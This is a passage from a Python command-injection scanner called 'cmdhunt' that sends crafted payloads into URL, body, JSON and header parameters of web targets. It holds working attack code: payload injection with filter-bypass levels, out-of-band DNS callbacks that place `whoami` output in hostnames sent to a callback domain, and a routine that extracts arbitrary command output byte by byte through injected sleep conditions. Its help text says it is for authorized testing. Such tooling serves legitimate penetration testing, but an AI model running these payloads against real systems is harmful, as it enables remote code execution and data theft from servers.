            q[point.name] = [base + value]
            body = urllib.parse.urlencode(q, doseq=True)
        elif point.kind == "json":
            try:
                obj = json.loads(tgt.body)
                base = (str(point.original) if append else "")
                body = json.dumps(json_set(obj, point.path, base + value))
            except Exception:
                return None
        elif point.kind == "header":
            base = (point.original if append else "")
            headers[point.name] = (base + value).replace("\r", "").replace(
                "\n", "")
        repr_ = f"{tgt.method} {url}"
        if body:
            repr_ += f"  [body] {body[:120]}"
        if point.kind == "header":
            repr_ += f"  [{point.name}] {headers[point.name][:120]}"
        return tgt.method, url, (body or None), headers, repr_

    def send(self, built, timeout=None):
        method, url, body, headers, _ = built
        if body is not None and "Content-Type" not in headers:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        return self.http.request(method, url, body, headers, timeout=timeout)

    # -- 1. expansion -------------------------------------------------------

    def try_expansion(self, tgt, point, payload, canary):
        value = payload.template.replace("{C}", canary)
        built = self.build(tgt, point, value)
        if not built:
            return None
        expect = (f"{canary}63{canary}" if payload.platform == "unix"
                  else f"{canary}Windows_NT{canary}")
        r = self.send(built)
        if not r.ok:
            self.rep.debug(f"{point.label()} {payload.label}: {r.error[:60]}")
            return None
        body = r.body or ""
        if expect in body:
            return built, r, expect
        # the literal template coming back is reflection, not execution
        if value.replace("%0a", "\n") in body or canary in body:
            self.rep.skipped(f"{point.label()} {payload.label}: value "
                             f"reflected but not expanded (no shell)")
        return None

    # -- 2. out of band -----------------------------------------------------

    def try_oob(self, tgt, point, payload, token):
        host = f"{token}.{self.args.blind}"
        value = payload.template.replace("{H}", host)
        built = self.build(tgt, point, value)
        if not built:
            return None
        r = self.send(built)
        self.record_oob(token, tgt.url, point, payload, built[4])
        if not r.ok:
            self.rep.debug(f"{point.label()} {payload.label}: {r.error[:60]}")
        return built, r, host

    # -- 3. timing ----------------------------------------------------------

    def baseline(self, tgt, point, samples=3):
        times = []
        for _ in range(samples):
            built = self.build(tgt, point, "cmdhunt", append=True)
            if not built:
                return None
            r = self.send(built)
            if not r.ok:
                return None
            times.append(r.elapsed)
        return statistics.median(times)

    def try_timing(self, tgt, point, payload, base):
        """Believed only when the delay scales: 5s then 10s."""
        short, long = self.args.sleep, self.args.sleep * 2
        v1 = payload.template.replace("{S}", str(short))
        b1 = self.build(tgt, point, v1)
        if not b1:
            return None
        r1 = self.send(b1, timeout=short * 3 + 10)
        if not r1.ok or r1.elapsed < base + short * 0.7:
            return None
        self.rep.info(f"{point.label()} {payload.label}: first delay matched "
                      f"({r1.elapsed:.1f}s vs baseline {base:.1f}s), "
                      f"confirming with {long}s")
        v2 = payload.template.replace("{S}", str(long))
        b2 = self.build(tgt, point, v2)
        r2 = self.send(b2, timeout=long * 3 + 10)
        if not r2.ok:
            return None
        if r2.elapsed < base + long * 0.7:
            self.rep.info(f"{point.label()} {payload.label}: the delay did "
                          f"NOT scale ({r2.elapsed:.1f}s) - not reported")
            return None
        return b1, r1, r2, base


    # -- time-based exfiltration -------------------------------------------

    def ask(self, tgt, point, condition, seconds):
        """`if [ <condition> ];then sleep N;fi` - true is a delay."""
        tpl = ";if [ %s ];then sleep %d;fi;#" % (condition, seconds)
        built = self.build(tgt, point, tpl)
        if not built:
            return None
        r = self.send(built, timeout=seconds * 3 + 15)
        if not r.ok:
            return None
        return r.elapsed

    def exfil_timing(self, tgt, point, base, cmd):
        """
        Read the output of `cmd` back through the delay, one byte at a time,
        by binary search on the byte value: 7 requests per character instead
        of 95. The reference does this linearly over the alphabet; this is
        the same idea, bounded.
        """
        s = self.args.sleep
        thresh = base + s * 0.7

        def truth(cond):
            el = self.ask(tgt, point, cond, s)
            return el is not None and el >= thresh

        # sanity: a condition that is always true must delay, one that is
        # always false must not. Without this the rest is noise.
        if not truth("1 -eq 1"):
            self.rep.info("exfil: the always-true probe did not delay, "
                          "aborting")
            return ""
        if truth("1 -eq 2"):
            self.rep.info("exfil: the always-false probe delayed too, "
                          "aborting (the timing is not reliable here)")
            return ""

        # length first
        lo, hi = 0, 128
        while lo < hi:
            mid = (lo + hi) // 2
            if truth(f"$({cmd}|tr -d '\\n'|wc -c) -gt {mid}"):
                lo = mid + 1
            else:
                hi = mid
        length = min(lo, self.args.exfil_max)
        if not length:
            self.rep.info("exfil: the command returned nothing")
            return ""
        self.rep.info(f"exfil: {cmd} returns {lo} byte(s), reading "
                      f"{length}")

        out = []
        for pos in range(1, length + 1):
            lo, hi = 32, 127
            byte = (f"$({cmd}|cut -c {pos}|od -An -tuC|awk '{{print $1}}')")
            while lo < hi:
                mid = (lo + hi) // 2
                if truth(f"{byte} -gt {mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            out.append(chr(lo))
            self.rep.info(f"exfil: {''.join(out)}")
        return "".join(out)

    # -- PoC ----------------------------------------------------------------

    @staticmethod
    def quote(s):
        return "'" + str(s).replace("'", "'\"'\"'") + "'"

    def curl_for(self, built):
        method, url, body, headers, _ = built
        bits = [f"curl -sk -X {method} {self.quote(url)}"]
        for k, v in headers.items():
            if k.lower() in ("accept-encoding",):
                continue
            bits.append("-H " + self.quote(f"{k}: {v}"))
        if body:
            bits.append("--data " + self.quote(body))
        return " ".join(bits)

    # -- orchestration ------------------------------------------------------

    def hunt(self, tgt: Target):
        started = time.time()
        before = len(self.findings)
        self.rep.banner(f"Hunting {tgt.url}")
        try:
            points = self.points_of(tgt)
            if not points:
                self.rep.test(f"{tgt.url}: no injection point "
                              f"(no parameter, no body, headers disabled)")
                return
            self.rep.info(f"{len(points)} injection point(s): "
                          f"{', '.join(p.label() for p in points[:8])}"
                          + (" ..." if len(points) > 8 else ""))

            if self.args.no_linux and self.args.no_windows:
                self.rep.warn("--no-linux and --no-windows together leave "
                              "nothing to send")
                return
            plat = ("windows" if self.args.no_linux else
                    "unix" if self.args.no_windows else "auto")
            payloads = build_payloads(
                plat, bool(self.args.blind),
                self.args.time_based, self.args.sleep, self.args.level)
            self.rep.info(f"level {self.args.level}: {len(payloads)} payload(s) "
                          f"per injection point")

            confirmed = 0
            for point in points:
                if self.args.confirm_x and confirmed >= self.args.confirm_x:
                    self.rep.info(f"{self.args.confirm_x} finding(s) "
                                  f"confirmed on this URL, moving on")
                    break
                found_here = False

                # -- expansion: cheapest and strongest
                for pl in [p for p in payloads if p.technique == "expansion"]:
                    canary = self.next_token()
                    self.rep.test(f"{point.label()} <- {pl.platform} "
                                  f"{pl.label} (expansion)")
                    hit = self.try_expansion(tgt, point, pl, canary)
                    if hit:
                        built, r, expect = hit
                        self.add(Finding(
                            sev=CRIT,
                            title=f"Command injection confirmed by shell "
                                  f"expansion in {point.label()}",
                            url=tgt.url,
                            impact="The payload came back evaluated, not "
                                   "echoed. A shell on the server interpreted "
                                   "input you control: this is remote code "
                                   "execution.",
                            proof=[f"platform: {pl.platform}",
                                   f"separator: {pl.label}",
                                   f"sent:     {pl.template.replace('{C}', canary)}",
                                   f"returned: {expect}   "
                                   f"(reflection would have returned the "
                                   f"literal template)"],
                            poc=self.curl_for(built),
                            chain="replace echo with any command; nothing "
                                  "destructive was run"))
                        found_here = True
                        confirmed += 1
                        break

                # -- out of band
                #
                # This runs even when the expansion test already succeeded.
                # Removing --all-points turned an "and not all_points" into an
                # unconditional skip, which meant the most obvious targets -
                # the ones that echo their output back, DVWA included - never
                # sent a single callback. The two channels are not redundant:
                # the DNS hit is independent proof for the report, and the
                # EXFIL variants are what put `whoami` in the hostname.
                if self.args.blind:
                    for pl in [p for p in payloads
                               if p.technique in ("oob", "argv")]:
                        token = self.next_token()
                        self.rep.test(f"{point.label()} <- {pl.platform} "
                                      f"{pl.label} (oob {token})")
                        self.try_oob(tgt, point, pl, token)
                    # the callback may already be in the log: checking now is
                    # what lets --confirm-x cut a URL short
                    if self.args.dns_log:
                        confirmed += self.check_dns_log(tgt.url)

                # -- timing, last and only if it scales
                if self.args.time_based and not found_here:
                    base = self.baseline(tgt, point)
                    if base is None:
                        continue
                    for pl in [p for p in payloads if p.technique == "timing"]:
                        self.rep.test(f"{point.label()} <- {pl.platform} "
                                      f"{pl.label} (timing)")
                        hit = self.try_timing(tgt, point, pl, base)
                        if hit:
                            b1, r1, r2, base = hit
                            self.add(Finding(
                                sev=HIGH,
                                title=f"Command injection by scaled delay in "
                                      f"{point.label()}",
                                url=tgt.url,
                                impact="The response time follows the sleep "
                                       "length on two different values, "
                                       "against a measured baseline. A slow "
                                       "endpoint does not do that.",
                                proof=[f"baseline: {base:.2f}s",
                                       f"sleep {self.args.sleep}s -> "
                                       f"{r1.elapsed:.2f}s",
                                       f"sleep {self.args.sleep * 2}s -> "
                                       f"{r2.elapsed:.2f}s",
                                       f"separator: {pl.label}"],
                                note="timing is the weakest evidence here; "
                                     "confirm with -b and a callback before "
                                     "reporting",
                                poc=self.curl_for(b1)))
                            confirmed += 1
                            if self.args.exfil:
                                data = self.exfil_timing(tgt, point, base,
                                                         self.args.exfil)
                                if data:
                                    self.add(Finding(
                                        sev=CRIT,
                                        title=f"Command output read back "
                                              f"through the delay",
                                        url=tgt.url,
                                        impact="Not just reachable: the "
                                               "output of a command was "
                                               "reconstructed byte by byte "
                                               "with no output channel and "
                                               "no callback.",
                                        proof=[f"command: {self.args.exfil}",
                                               f"output:  {data}"],
                                        note=f"binary search on each byte, "
                                             f"~7 requests per character"))
                            confirmed += 1
                            break
        except Exception as e:
            self.rep.error(f"{tgt.url}: {type(e).__name__}: {e}")
            if self.args.verbose >= 2:
                import traceback
                traceback.print_exc()
        finally:
            got = self.findings[before:]
            self.rep.line(f"\n--- {tgt.url}: {len(got)} finding(s) in "
                          f"{time.time() - started:.1f}s ---")
            if self.status:
                self.status.target_done()

    # -- OOB correlation ----------------------------------------------------


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------

BANNER = r"""
  cmdhunt - OS command injection, confirmed not guessed
  read-only payloads; authorized testing only
"""

EPILOG = """
coverage (PayloadsAllTheThings: Command Injection)
  chaining      ; && || & | , newline, CRLF, and `#` to comment out whatever
                followed the injection point
  no separator  arithmetic expansion alone, for a value that lands unquoted
  quoting       single- and double-quote break, with and without restoring
  no space      ${IFS}, $IFS$9, tab, brace expansion, here-string
  command word  quotes, backslash, $@, $(), backticks, hex, ANSI-C quoting,
                wildcard paths, mixed case, caret escapes (Windows)
  polyglots     one payload valid unquoted, single-quoted and double-quoted
  argv          -oProxyCommand, --use-askpass, --gpu-launcher, curl -o/-F,
                and the WorstFit fullwidth-quote trick (needs -b)
  exfiltration  DNS (output inside the hostname, one query per entry of /),
                HTTP, and --exfil for the pure timing channel
  tricks        nohup backgrounding, for parents that time out

why the results can be trusted
  expansion  `;echo cmdhXXXX$((9*7))cmdhXXXX;` returns cmdhXXXX63cmdhXXXX.
             A server that merely reflects your input returns the literal
             $((9*7)). There is no third possibility, so this cannot be a
             false positive. Windows uses %OS% -> Windows_NT the same way.
  oob        every payload carries a unique token, and --dns-log greps your
             resolver's log for the pending ones - during the run, so
             --confirm-x can cut a URL short, and again at the end. A blind
             injection is then confirmed by the DNS resolution ALONE, with
             nothing in the HTTP response. Tokens still unconfirmed when the
             run ends are printed: a hit hours later is still a confirmed
             RCE. The EXFIL variants put `whoami` / %USERNAME% inside the
             hostname, so the log tells you who is running the command.
  timing     only reported when the delay SCALES: sleep N then sleep 2N, both
             measured against a baseline. One slow response proves nothing
             and is never reported.

what is actually executed
  echo, an arithmetic expansion, a DNS lookup or an HTTP GET to your own
  domain, and sleep. Nothing writes, deletes, or fetches remote code.

examples
  cmdhunt.py -u 'https://target/ping?host=127.0.0.1' -b oob.example.com
  cmdhunt.py -u 'https://target/export/report/pdf' -b oob.tld \\
             --dns-log /var/log/named/queries.log
  cmdhunt.py -r burp.txt -b oob.tld --dns-log dns.log --confirm-x 1 -v 1
  cmdhunt.py -l urls.txt -b oob.tld -t 8 -d 0.2 --status-interval 15 --no-path
  cmdhunt.py -u 'https://target/admin' --param cmd,host --replace
"""


def build_parser():
    p = argparse.ArgumentParser(
        prog="cmdhunt.py", description=BANNER, epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-v", dest="verbose", type=int, nargs="?", const=1,
                   default=0, choices=[0, 1, 2],
                   help="verbosity: 0 = only findings (default), 1 = every "
                        "test performed, 2 = debug (the exact payload sent, "
                        "response status/size/timing, and payloads skipped "
                        "because the value was reflected but not expanded)")
    p.add_argument("-u", dest="url", help="single URL to test")
    p.add_argument("-l", dest="list", help="file containing a list of URLs")
    p.add_argument("-r", "--request", metavar="FILE",
                   help="raw HTTP request file (Burp/ZAP export): method, "
                        "headers (Cookie...) and body are replayed, and "
                        "injection covers query params, POST body params, "
                        "JSON body values and request headers (disable the "
                        "last two with --no-post / --no-headers)")
    p.add_argument("--force-ssl", action="store_true",
                   help="force https for a -r request (default: inferred "
                        "from Origin/Referer, else http)")
    p.add_argument("--no-color", action="store_true",
                   help="disable coloured output (colour is on by default)")
    p.add_argument("--status-interval", type=float, default=30.0,
                   metavar="SEC",
                   help="seconds between status lines in -l mode (default 30)")
    p.add_argument("-t", "--threads", type=int, default=4,
                   help="concurrent targets (default 4)")
    p.add_argument("-d", "--delay", type=float, default=0.0, metavar="SEC",
                   help="minimum gap between requests, enforced globally "
                        "across all threads")
    p.add_argument("-H", "--header", action="append", default=[],
                   metavar="HEADER",
                   help="extra header 'Name: value' (repeatable) - also how "
                        "to set a Cookie or override the User-Agent")
    p.add_argument("-p", "--proxy", help="proxy URL, e.g. http://127.0.0.1:8080")
    p.add_argument("-o", "--output", default="", metavar="FILE",
                   help="log file for the results (default: no log)")
    p.add_argument("-b", "--blind", default="", metavar="DOMAIN",
                   help="OOB callback domain for the blind tests, e.g. "
                        "oob.example.com. Every payload gets a unique "
                        "subdomain token. Blind tests are skipped when this "
                        "is omitted.")
    p.add_argument("--dns-log", metavar="FILE",
                   help="path to your DNS server's log file; checked as a "
                        "plain substring match for each pending OOB token "
                        "(incrementally during the run when --confirm-x is "
                        "set, and once at the end), confirming a blind "
                        "injection by DNS resolution alone even when nothing "
                        "is reflected in the HTTP response (requires -b)")
    p.add_argument("--confirm-x", type=int, default=3, metavar="N",
                   help="stop testing a URL once N findings are confirmed "
                        "(default 3). The incremental DNS check that makes "
                        "out-of-band findings confirmable mid-run only "
                        "happens with --dns-log.")
    p.add_argument("--level", type=int, choices=[1, 2, 3], default=1,
                   help="how hard to push on filter bypasses. 1 (default): "
                        "the separators and the plain command. 2: quoted, "
                        "backslashed, $@ / $() / ${IFS} / tab / brace command "
                        "words, plus argument-injection vectors. 3: hex "
                        "encoding, wildcard paths, ANSI-C quoting, mixed "
                        "case, backslash-newline. Each level costs requests.")
    p.add_argument("--exfil", metavar="CMD",
                   help="after a TIMING-confirmed injection, read the output "
                        "of this command back one character at a time by "
                        "binary search on each byte (7 requests per "
                        "character, not 95). Only useful when neither the "
                        "output nor a callback is available. e.g. --exfil "
                        "whoami")
    p.add_argument("--exfil-max", type=int, default=24, metavar="N",
                   help="characters to recover with --exfil (default 24)")
    p.add_argument("--no-linux", action="store_true",
                   help="do not send the Unix payload families")
    p.add_argument("--no-windows", action="store_true",
                   help="do not send the Windows payload families")
    p.add_argument("--no-path", action="store_true",
                   help="skip URL path segments, test query parameters only "
                        "(path testing multiplies the request count by the "
                        "number of segments)")
    p.add_argument("--replace", action="store_true",
                   help="overwrite the parameter instead of appending the "
                        "payload to its current value (default: append)")
    p.add_argument("--param", metavar="LIST",
                   help="test only these comma-separated parameters")
    p.add_argument("--no-guess", action="store_true",
                   help="do not try common parameter names on parameterless "
                        "URLs (guessing is on by default: a URL with no "
                        "parameter has nothing to test otherwise)")
    p.add_argument("--time-based", action="store_true",
                   help="also try sleep-based detection. Off by default: it "
                        "is slow and it is the only technique here that can "
                        "be wrong. Reported only when the delay scales.")
    p.add_argument("--sleep", type=int, default=5, metavar="SEC",
                   help="sleep length for the timing tests; the confirmation "
                        "uses twice this (default 5)")
    p.add_argument("--no-post", action="store_true",
                   help="do not inject into POST body parameters")
    p.add_argument("--no-headers", action="store_true",
                   help="do not inject into request headers")
    p.add_argument("--timeout", type=float, default=20.0,
                   help="request timeout (s, default 20)")
    p.add_argument("--version", action="version",
                   version=f"%(prog)s {VERSION}")
    return p


def load_urls(path):
    out = []
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    out.append(line)
    except Exception as e:
        print(f"cannot read {path}: {e}", file=sys.stderr)
        sys.exit(2)
    return out


def main(argv=None):
    args = build_parser().parse_args(argv)
    if args.no_color or not sys.stdout.isatty():
        Colors.disable()
    rep = Reporter(args.verbose, args.output or None)

    targets = []
    if args.request:
        try:
            targets.append(parse_raw_request(args.request, args.force_ssl))
        except Exception as e:
            print(f"-r: {e}", file=sys.stderr)
            sys.exit(2)
    for u in ([args.url] if args.url else []) + \
             (load_urls(args.list) if args.list else []):
        targets.append(Target(url=u if "://" in u else "https://" + u))
    if not targets:
        print("nothing to do: give -u, -l or -r", file=sys.stderr)
        sys.exit(2)

    http = Http(timeout=args.timeout, proxy=args.proxy, headers=args.header,
                delay=args.delay, rep=rep)
    status = Status(rep, len(targets), args.status_interval,
                    enabled=bool(args.list))
    hunter = CmdHunter(http, rep, args, status)

    print(f"{Colors.CYAN}{BANNER}{Colors.RESET}")
    print(f"  targets {Colors.BOLD}{len(targets)}{Colors.RESET}   "
          f"threads {args.threads}   timeout {args.timeout:.0f}s"
          + (f"   delay {args.delay}s" if args.delay else "")
          + (f"   oob -> {args.blind}" if args.blind
             else f"   {Colors.YELLOW}no -b: blind tests skipped"
                  f"{Colors.RESET}")
          + ("   timing ON" if args.time_based else "")
          + (f"   log -> {args.output}" if args.output else ""))
    print()

    t0 = time.time()
    status.start_thread()
    if len(targets) == 1 or args.threads <= 1:
        for t in targets:
            hunter.hunt(t)
    else:
        with concurrent.futures.ThreadPoolExecutor(
                max_workers=args.threads) as ex:
            list(ex.map(hunter.hunt, targets))
    status.stop()
    if args.dns_log and args.blind:
        rep.line(f"\nfinal check of {args.dns_log} for the tokens sent "
                 f"during this run")
        hunter.check_dns_log()

    C = Colors
    rep.line(f"\n{C.BOLD}--- summary ---{C.RESET}")
    rep.line(f"targets   : {len(targets)}")
    rep.line(f"requests  : {http.count}")
    rep.line(f"duration  : {time.time() - t0:.1f}s")
    counts = {}
    for f in hunter.findings:
        counts[f.sev] = counts.get(f.sev, 0) + 1
    if not counts:
        rep.line("findings  : none")
    for sev in (CRIT, HIGH, MED, LOW, INFO):
        if counts.get(sev):
            rep.line(f"  {sev_paint(sev)}{sev:<10}{C.RESET} {counts[sev]}")
    pending = [r for r in hunter.oob_rows if not r["confirmed"]]
    if pending:
        rep.line(f"\n{len(hunter.oob_rows)} out-of-band payload(s) sent, "
                 f"{len(pending)} still unconfirmed. Callbacks lag: any of "
                 f"these tokens")
        rep.line("appearing in your DNS or HTTP logs later is a confirmed "
                 "RCE. They are listed below (and in -o, if set):")
        for r in pending:
            rep.line(f"  {r['host']}   {r['target']}   {r['point']}   "
                     f"{r['payload']}")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\ninterrupted", file=sys.stderr)
        sys.exit(130)
